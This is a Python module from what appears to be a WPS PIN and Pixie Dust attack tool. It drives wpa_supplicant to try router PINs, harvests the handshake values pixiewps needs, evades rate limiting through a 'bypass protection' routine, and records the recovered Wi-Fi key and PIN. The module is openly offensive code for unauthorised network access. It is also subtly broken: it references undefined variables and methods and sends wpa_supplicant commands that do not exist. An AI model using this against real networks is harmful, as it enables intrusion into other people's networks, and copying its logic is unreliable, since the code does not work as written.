import socket
import tempfile
import os
import subprocess
import time
import shutil
import sys
import codecs
import json
from datetime import datetime

import src.wps.pixiewps
import src.wps.generator
import src.utils
import src.wifi.collector

class ConnectionStatus:
    """Stores WPS connection details and status."""

    def __init__(self):
        self.STATUS = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.LAST_M_MESSAGE = 0
        self.ESSID = ''
        self.BSSID = ''
        self.WPA_PSK = ''

    def isFirstHalfValid(self) -> bool:
        """Checks if the first half of the PIN is valid."""
        return self.LAST_M_MESSAGE > 5

    def clear(self):
        """Resets the connection status variables."""
        self.__init__()

class Initialize:
    """WPS connection"""

    def __init__(self, interface: str, write_result: bool = False, save_result: bool = False, print_debug: bool = False):
        self.INTERFACE    = interface
        self.WRITE_RESULT = write_result
        self.SAVE_RESULT  = save_result
        self.PRINT_DEBUG  = print_debug

        self.CONNECTION_STATUS = ConnectionStatus()
        self.PIXIE_CREDS  = src.wps.pixiewps.Data()
        
        # Import router profiles for timing configurations
        from . import router_profiles
        self.ROUTER_PROFILES = router_profiles

        self.TEMPDIR = tempfile.mkdtemp()

        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n')
            self.TEMPCONF = temp.name

        self.WPAS_CTRL_PATH = f'{self.TEMPDIR}/{self.INTERFACE}'
        self._initWpaSupplicant()

        self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
        self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.RETSOCK.bind(self.RES_SOCKET_FILE)

    @staticmethod
    def _getHex(line: str) -> str:
        """Filters WPA Supplicant output, and removes whitespaces"""

        a = line.split(':', 3)
        return a[2].replace(' ', '').upper()

    @staticmethod
    def _explainWpasNotOkStatus(status_type: str, line: str) -> str:
        """Provide detailed explanation of WPS failures."""
        error_codes = {
            'WPS_REG': {
                'timeout': 'Router not responding - possible rate limiting',
                'failed': 'Registration failed - incorrect PIN or router protection',
                'invalid_pin': 'Invalid PIN format or checksum',
                'no_ap_settings': 'Router not providing AP settings',
                'eap_fail': 'EAP authentication failed',
                'config_error': 'Configuration error in router',
                'no_response': 'No response from router - possible interference'
            }
        }
        
        if status_type not in error_codes:
            return f'Unknown error type: {status_type}'
            
        for error_key, message in error_codes[status_type].items():
            if error_key in line.lower():
                return f'[-] {message}'
                
        return f'[-] Unknown {status_type} error: {line}'

    def _handle_error_recovery(self, error_type: str, bssid: str, manufacturer: str):
        """Implement error-specific recovery strategies."""
        recovery_strategies = {
            'timeout': {
                'action': self._handle_timeout_recovery,
                'max_retries': 3
            },
            'rate_limit': {
                'action': self._handle_rate_limiting,
                'max_retries': 2
            },
            'auth_fail': {
                'action': self._handle_auth_failure,
                'max_retries': 3
            },
            'interference': {
                'action': self._handle_interference,
                'max_retries': 4
            }
        }
        
        if error_type in recovery_strategies:
            strategy = recovery_strategies[error_type]
            retries = 0
            while retries < strategy['max_retries']:
                if strategy['action'](bssid, manufacturer):
                    return True
                retries += 1
                time.sleep(2 * (retries + 1))  # Progressive backoff
        
        return False

    def _handle_timeout_recovery(self, bssid: str, manufacturer: str):
        """Handle timeout-specific recovery."""
        try:
            # Reset the connection
            self._cleanup()
            self._initWpaSupplicant()
            
            # Some routers need a complete interface reset
            self._sendOnly('INTERFACE_DISABLE')
            time.sleep(1)
            self._sendOnly('INTERFACE_ENABLE')
            
            return True
        except Exception:
            return False

    def _handle_auth_failure(self, bssid: str, manufacturer: str):
        """Handle authentication failure recovery."""
        try:
            # Some routers need a complete WPS session reset
            self._sendOnly('WPS_CANCEL')
            time.sleep(1)
            
            # Try alternative authentication method
            profile = self.ROUTER_PROFILES.get_router_profile(manufacturer)
            if profile and 'alt_auth_method' in profile:
                self._sendOnly(f"SET wps_auth_method {profile['alt_auth_method']}")
            
            return True
        except Exception:
            return False

    def _handle_interference(self, bssid: str, manufacturer: str):
        """Handle wireless interference recovery."""
        try:
            # Change channel if possible
            self._sendOnly('SCAN_RESULTS')
            time.sleep(1)
            
            # Try to find a less congested channel
            self._sendOnly(f'SET_CHANNEL {bssid} auto')
            time.sleep(2)
            
            return True
        except Exception:
            return False

    def _get_router_timing(self, bssid: str, essid: str = None):
        """Get router-specific timing configuration."""
        manufacturer = None
        model = None
        version = None

        # Try to detect router info from ESSID if available
        if essid:
            for mfg in ['TP-LINK', 'D-LINK', 'ASUS', 'NETGEAR']:
                if mfg.lower() in essid.lower():
                    manufacturer = mfg
                    # Try to extract model from common formats
                    if '_' in essid:
                        parts = essid.split('_')
                        if len(parts) > 1:
                            model = parts[1]
                            if len(parts) > 2 and parts[2].startswith('V'):
                                version = parts[2][1:]
                    break

        # If not found in ESSID, try BSSID
        if not manufacturer:
            # Use the router detection from generator
            generator = src.wps.generator.WPSpin()
            manufacturer, model, version = generator._detect_manufacturer(bssid)

        # Get timing config from router profiles
        timing = self.ROUTER_PROFILES.get_timing_config(manufacturer, model, version)
        return timing

    def _handle_rate_limiting(self, bssid: str, manufacturer: str):
        """Handle router-specific rate limiting."""
        profile = self.ROUTER_PROFILES.get_router_profile(manufacturer)
        if not profile:
            return

        if profile.get('rate_limiting'):
            cooldown = profile.get('rate_limit_cooldown', 30)
            print(f'[*] Rate limiting detected, waiting {cooldown} seconds...')
            time.sleep(cooldown)
            
            # Some routers require restart after rate limit
            if profile.get('requires_restart'):
                self._restart_wps_service()

    def _bypass_protection(self, bssid: str, manufacturer: str):
        """Attempt to bypass WPS protection mechanisms."""
        profile = self.ROUTER_PROFILES.get_router_profile(manufacturer)
        if not profile:
            return False

        protection = profile.get('protection_mechanism')
        if protection == 'session_timeout':
            # Wait for session reset
            time.sleep(profile.get('session_timeout', 60))
            return True
        elif protection == 'progressive_delay':
            # Reset connection to avoid cumulative delay
            self._cleanup()
            self._initWpaSupplicant()
            return True
        elif protection == 'multi_stage':
            # Implement multi-stage authentication
            return self._handle_multi_stage_auth(bssid, profile)
        
        return False

    def _handle_multi_stage_auth(self, bssid: str, profile: dict):
        """Handle multi-stage authentication process."""
        stages = profile.get('auth_stages', [])
        for stage in stages:
            if stage['type'] == 'initial_handshake':
                if not self._perform_handshake(bssid):
                    return False
            elif stage['type'] == 'challenge_response':
                if not self._handle_challenge(bssid, stage):
                    return False
            elif stage['type'] == 'verification':
                if not self._verify_auth(bssid):
                    return False
        return True

    def singleConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False, showpixiecmd: bool = False,
                        pixieforce: bool = False, pbc_mode: bool = False, store_pin_on_fail: bool = False, essid: str = None) -> bool:
        """        
        Establish a WPS connection with router-specific optimizations
        """
        # Get router-specific timing configuration
        timing = self._get_router_timing(bssid, essid)
        delay = timing['delay']
        timeout = timing['timeout']
        retry_attempts = timing['retry_attempts']

        pixiewps_dir = src.utils.PIXIEWPS_DIR
        generator = src.wps.generator.WPSpin()
        collector = src.wifi.collector.WiFiCollector()

        if not pin:
            if pixiemode:
                try:
                    filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''

                    with open(filename, 'r', encoding='utf-8') as file:
                        t_pin = file.readline().strip()
                        if input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] ').lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = generator.getLikely(bssid, essid) or '12345670'

        for attempt in range(retry_attempts):
            try:
                # Configure WPA Supplicant with router-specific timeout
                self._sendOnly(f'SET wps_timeout {timeout}')
                
                # Start WPS session
                if pbc_mode:
                    self._sendOnly('WPS_PBC')
                else:
                    self._sendOnly(f'WPS_PIN {bssid} {pin}')

                # Handle WPS connection with router-specific delay
                while True:
                    time.sleep(delay)
                    
                    if not self._handleWpas(pixiemode, pbc_mode):
                        break

                    if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
                        # Success - store the working configuration
                        self._store_working_config(bssid, timing['manufacturer'], timing['model'], timing['version'], pin)
                        return True

                    if self.CONNECTION_STATUS.STATUS in ['WSC_NACK', 'WPS_FAIL']:
                        break

            except Exception as e:
                print(f'[-] Error during attempt {attempt + 1}: {str(e)}')
                if attempt < retry_attempts - 1:
                    print(f'[*] Retrying in {delay * 2} seconds...')
                    time.sleep(delay * 2)
                    self._handle_rate_limiting(bssid, timing['manufacturer'])
                    if not self._bypass_protection(bssid, timing['manufacturer']):
                        print('[-] Failed to bypass protection mechanism')
                        return False
                continue

        return False

    def _store_working_config(self, bssid, manufacturer, model, version, pin):
        """Store working configuration for future reference."""
        try:
            config_file = f'{src.utils.PIXIEWPS_DIR}working_configs.json'
            
            # Load existing configurations
            configs = {}
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    configs = json.load(f)
            
            # Add new working configuration
            configs[bssid] = {
                'manufacturer': manufacturer,
                'model': model,
                'version': version,
                'pin': pin,
                'timestamp': datetime.now().isoformat()
            }
            
            # Save updated configurations
            with open(config_file, 'w') as f:
                json.dump(configs, f, indent=4)
                
        except Exception as e:
            print(f'[-] Failed to store working configuration: {str(e)}')

    def _initWpaSupplicant(self):
        """Initializes wpa_supplicant with the specified configuration"""

        print('[*] Running wpa_supplicant…')

        wpa_supplicant_cmd = ['wpa_supplicant']
        wpa_supplicant_cmd.extend([
            '-K', '-d',
            '-Dnl80211,wext,hostapd,wired',
            f'-i{self.INTERFACE}',
            f'-c{self.TEMPCONF}'
        ])

        self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
            encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )

        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.WPAS.poll()

            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.WPAS.communicate()[0])
            if os.path.exists(self.WPAS_CTRL_PATH):
                break

            time.sleep(.1)

    def _sendAndReceive(self, command: str) -> str:
        """Sends command to wpa_supplicant and returns the reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

        (b, _address) = self.RETSOCK.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def _sendOnly(self, command: str):
        """Sends command to wpa_supplicant without reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

    def _handleWpas(self, pixiemode: bool = False, pbc_mode: bool = False, verbose: bool = None) -> bool:
        """Handles WPA supplicant output and updates connection status."""

        # pylint: disable=invalid-name
        line = self.WPAS.stdout.readline()

        if not verbose:
            verbose = self.PRINT_DEBUG
        if not line:
            self.WPAS.wait()
            return False

        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'M2D' in line:
                print('[-] Received WPS Message M2D')
                src.utils.die('[-] Error: AP is not ready yet, try later')
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1])
                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
                print(f'[*] Sending WPS Message M{n}…')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
                print(f'[*] Received WPS Message M{n}')
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
                print('[-] Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.PIXIE_CREDS.E_NONCE = self._getHex(line)
                assert len(self.PIXIE_CREDS.E_NONCE) == 16 * 2
                if pixiemode:
                    print(f'[P] E-Nonce: {self.PIXIE_CREDS.E_NONCE}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.PIXIE_CREDS.PKR = self._getHex(line)
                assert len(self.PIXIE_CREDS.PKR) == 192 * 2
                if pixiemode:
                    print(f'[P] PKR: {self.PIXIE_CREDS.PKR}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.PIXIE_CREDS.PKE = self._getHex(line)
                assert len(self.PIXIE_CREDS.PKE) == 192 * 2
                if pixiemode:
                    print(f'[P] PKE: {self.PIXIE_CREDS.PKE}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.PIXIE_CREDS.AUTHKEY = self._getHex(line)
                assert len(self.PIXIE_CREDS.AUTHKEY) == 32 * 2
                if pixiemode:
                    print(f'[P] AuthKey: {self.PIXIE_CREDS.AUTHKEY}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.PIXIE_CREDS.E_HASH1 = self._getHex(line)
                assert len(self.PIXIE_CREDS.E_HASH1) == 32 * 2
                if pixiemode:
                    print(f'[P] E-Hash1: {self.PIXIE_CREDS.E_HASH1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.PIXIE_CREDS.E_HASH2 = self._getHex(line)
                assert len(self.PIXIE_CREDS.E_HASH2) == 32 * 2
                if pixiemode:
                    print(f'[P] E-Hash2: {self.PIXIE_CREDS.E_HASH2}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
                self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.CONNECTION_STATUS.STATUS = 'scanning'
                print('[*] Scanning…')
        elif ('WPS-FAIL' in line) and (self.CONNECTION_STATUS.STATUS != ''):
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            error_message = self._explainWpasNotOkStatus('WPS_REG', line)
            print(error_message)
            if 'rate limiting' in error_message.lower():
                self._handle_error_recovery('rate_limit', bssid, timing['manufacturer'])
            elif 'timeout' in error_message.lower():
                self._handle_error_recovery('timeout', bssid, timing['manufacturer'])
            elif 'auth fail' in error_message.lower():
                self._handle_error_recovery('auth_fail', bssid, timing['manufacturer'])
            elif 'interference' in error_message.lower():
                self._handle_error_recovery('interference', bssid, timing['manufacturer'])
            return False
        elif 'Trying to authenticate with' in line:
            self.CONNECTION_STATUS.STATUS = 'authenticating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Authenticating…')
        elif 'Authentication response' in line:
            print('[+] Authenticated')
        elif 'Trying to associate with' in line:
            self.CONNECTION_STATUS.STATUS = 'associating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Associating with AP…')
        elif ('Associated with' in line) and (self.INTERFACE in line):
            bssid = line.split()[-1].upper()
            if self.CONNECTION_STATUS.ESSID:
                print(f'[+] Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
            else:
                print(f'[+] Associated with {bssid}')
        elif 'EAPOL: txStart' in line:
            self.CONNECTION_STATUS.STATUS = 'eapol_start'
            print('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print('[*] Received Identity Request')
        elif 'using real identity' in line:
            print('[*] Sending Identity Response…')
        elif 'WPS-TIMEOUT' in line:
            print('[-] Warning: Received WPS-TIMEOUT')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.CONNECTION_STATUS.BSSID = bssid
            print(f'[*] Selected AP: {bssid}')

        return True

    def _wpsConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False,
                       pbc_mode: bool = False, verbose: bool = None) -> bool:
        """Handles WPS connection process"""

        self.PIXIE_CREDS.clear()
        self.CONNECTION_STATUS.clear()
        self.WPAS.stdout.read(300) # Clean the pipe

        if not verbose:
            verbose = self.PRINT_DEBUG

        if pbc_mode:
            if bssid:
                print(f'[*] Starting WPS push button connection to {bssid}…')
                cmd = f'WPS_PBC {bssid}'
            else:
                print('[*] Starting WPS push button connection…')
                cmd = 'WPS_PBC'
        else:
            print(f'[*] Trying PIN \'{pin}\'…')
            cmd = f'WPS_REG {bssid} {pin}'

        r = self._sendAndReceive(cmd)

        if 'OK' not in r:
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            error_message = self._explainWpasNotOkStatus(cmd, r)
            print(error_message)
            if 'rate limiting' in error_message.lower():
                self._handle_error_recovery('rate_limit', bssid, timing['manufacturer'])
            elif 'timeout' in error_message.lower():
                self._handle_error_recovery('timeout', bssid, timing['manufacturer'])
            elif 'auth fail' in error_message.lower():
                self._handle_error_recovery('auth_fail', bssid, timing['manufacturer'])
            elif 'interference' in error_message.lower():
                self._handle_error_recovery('interference', bssid, timing['manufacturer'])
            return False

        while True:
            res = self._handleWpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)

            if not res:
                break
            if self.CONNECTION_STATUS.STATUS == 'WSC_NACK':
                break
            if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
                break
            if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                break

        self._sendOnly('WPS_CANCEL')
        return False

    def _handle_wps_state_machine(self, bssid: str, pin: str, manufacturer: str):
        """Handle WPS protocol state machine with advanced error recovery."""
        states = {
            'M1': {'sent': False, 'received': False, 'retries': 0},
            'M2': {'sent': False, 'received': False, 'retries': 0},
            'M3': {'sent': False, 'received': False, 'retries': 0},
            'M4': {'sent': False, 'received': False, 'retries': 0},
            'M5': {'sent': False, 'received': False, 'retries': 0},
            'M6': {'sent': False, 'received': False, 'retries': 0},
            'M7': {'sent': False, 'received': False, 'retries': 0},
            'M8': {'sent': False, 'received': False, 'retries': 0}
        }
        
        max_retries = 3
        current_state = 'M1'
        
        while current_state != 'DONE':
            try:
                if states[current_state]['retries'] >= max_retries:
                    print(f'[-] Maximum retries reached at state {current_state}')
                    return False
                
                # Handle state transitions
                if current_state == 'M1':
                    if self._send_m1(bssid):
                        states['M1']['sent'] = True
                        if self._wait_for_m2():
                            states['M2']['received'] = True
                            current_state = 'M3'
                            continue
                
                elif current_state == 'M3':
                    if self._send_m3(pin):
                        states['M3']['sent'] = True
                        if self._wait_for_m4():
                            states['M4']['received'] = True
                            current_state = 'M5'
                            continue
                
                elif current_state == 'M5':
                    if self._send_m5():
                        states['M5']['sent'] = True
                        if self._wait_for_m6():
                            states['M6']['received'] = True
                            current_state = 'M7'
                            continue
                
                elif current_state == 'M7':
                    if self._send_m7():
                        states['M7']['sent'] = True
                        if self._wait_for_m8():
                            states['M8']['received'] = True
                            current_state = 'DONE'
                            return True
                
                # Handle state failure
                print(f'[-] Failed at state {current_state}, retrying...')
                states[current_state]['retries'] += 1
                
                # Some routers need a cooldown between retries
                time.sleep(2)
                
            except Exception as e:
                print(f'[-] Error in state {current_state}: {str(e)}')
                states[current_state]['retries'] += 1
                
                # Reset connection if needed
                if 'timeout' in str(e).lower():
                    self._cleanup()
                    self._initWpaSupplicant()
        
        return False

    def _send_m1(self, bssid: str):
        """Send WPS M1 message."""
        try:
            self._sendOnly(f'WPS_START {bssid}')
            return True
        except Exception:
            return False

    def _wait_for_m2(self):
        """Wait for WPS M2 message."""
        start_time = time.time()
        timeout = 5  # seconds
        
        while time.time() - start_time < timeout:
            if self.CONNECTION_STATUS.LAST_M_MESSAGE == 2:
                return True
            time.sleep(0.1)
        
        return False

    def _send_m3(self, pin: str):
        """Send WPS M3 message with PIN."""
        try:
            self._sendOnly(f'WPS_PIN {pin}')
            return True
        except Exception:
            return False

    def _wait_for_m4(self):
        """Wait for WPS M4 message."""
        start_time = time.time()
        timeout = 5  # seconds
        
        while time.time() - start_time < timeout:
            if self.CONNECTION_STATUS.LAST_M_MESSAGE == 4:
                return True
            time.sleep(0.1)
        
        return False

    def _send_m5(self):
        """Send WPS M5 message."""
        try:
            self._sendOnly('WPS_CONTINUE')
            return True
        except Exception:
            return False

    def _wait_for_m6(self):
        """Wait for WPS M6 message."""
        start_time = time.time()
        timeout = 5  # seconds
        
        while time.time() - start_time < timeout:
            if self.CONNECTION_STATUS.LAST_M_MESSAGE == 6:
                return True
            time.sleep(0.1)
        
        return False

    def _send_m7(self):
        """Send WPS M7 message."""
        try:
            self._sendOnly('WPS_CONTINUE')
            return True
        except Exception:
            return False

    def _wait_for_m8(self):
        """Wait for WPS M8 message."""
        start_time = time.time()
        timeout = 5  # seconds
        
        while time.time() - start_time < timeout:
            if self.CONNECTION_STATUS.LAST_M_MESSAGE == 8:
                return True
            time.sleep(0.1)
        
        return False

    def _cleanup(self):
        """Terminates connections and removes temporary files"""

        self.RETSOCK.close()
        self.WPAS.terminate()
        os.remove(self.RES_SOCKET_FILE)
        shutil.rmtree(self.TEMPDIR, ignore_errors=True)
        os.remove(self.TEMPCONF)

    def __del__(self):
        try:
            self._cleanup()
        except Exception:
            pass
